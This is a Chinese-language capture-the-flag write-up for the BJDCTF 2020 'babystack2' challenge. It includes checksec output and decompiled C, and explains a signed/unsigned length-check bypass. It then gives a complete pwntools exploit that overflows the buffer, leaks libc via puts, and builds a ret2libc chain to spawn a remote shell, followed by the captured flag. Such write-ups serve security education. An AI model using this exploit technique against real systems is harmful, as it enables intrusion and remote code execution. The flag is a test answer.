`checksec`结果
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

IDA查看源码
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[12]; // [rsp+0h] [rbp-10h] BYREF
  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF

  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  LODWORD(nbytes) = 0;
  puts("**********************************");
  puts("*     Welcome to the BJDCTF!     *");
  puts("* And Welcome to the bin world!  *");
  puts("*  Let's try to pwn the world!   *");
  puts("* Please told me u answer loudly!*");
  puts("[+]Are u ready?");
  puts("[+]Please input the length of your name:");
  __isoc99_scanf("%d", &nbytes);
  if ( (int)nbytes > 10 )
  {
    puts("Oops,u name is too long!");
    exit(-1);
  }
  puts("[+]What's u name?");
  read(0, buf, (unsigned int)nbytes);
  return 0;
}
```
显然的，因为对比的时候用的是`(int)`转化，而后面真正使用的时候又是`(unsigned int)`，所以输入负数就可以绕过10的限制。

后面思路就很常规了，通过`puts`泄露libc，然后得到`system`和`"/bin/sh"`的地址，然后获取shell

exp

```python
from pwn import *
from LibcSearcher import *

context.os = "linux"
context.arch = "amd64"
# context.log_level = "debug"

p = remote("node4.buuoj.cn", 26794)

p.recvuntil("length of your name:\n")
p.sendline(b'-1')

p.recvuntil("u name?\n")

e = ELF("./bjdctf_2020_babystack2")
putsP = e.plt["puts"]
putsG = e.got["puts"]
mainFunc = 0x40073b
pop_rdi = 0x400893

payload1 = b'a'*(0x10 + 8) + p64(pop_rdi) + p64(putsG) +p64(putsP) + p64(mainFunc)
p.sendline(payload1)

putsA = u64(p.recvline()[:-1].ljust(8, b'\x00')) # [:-1]去除'\n'

libc = LibcSearcher("puts", putsA)
offset = putsA - libc.dump("puts")
systemA = offset + libc.dump("system")
binshA = offset + libc.dump("str_bin_sh")

payload2 = b'a'*(0x10 + 8) + p64(pop_rdi) + p64(binshA) +p64(systemA)

p.recvuntil("length of your name:\n")
p.sendline(b'-1')

p.recvuntil("u name?\n")
p.sendline(payload2)

p.interactive()
```

`flag{49c2bba6-f465-45d3-8403-2f5ccc0d6c5e}`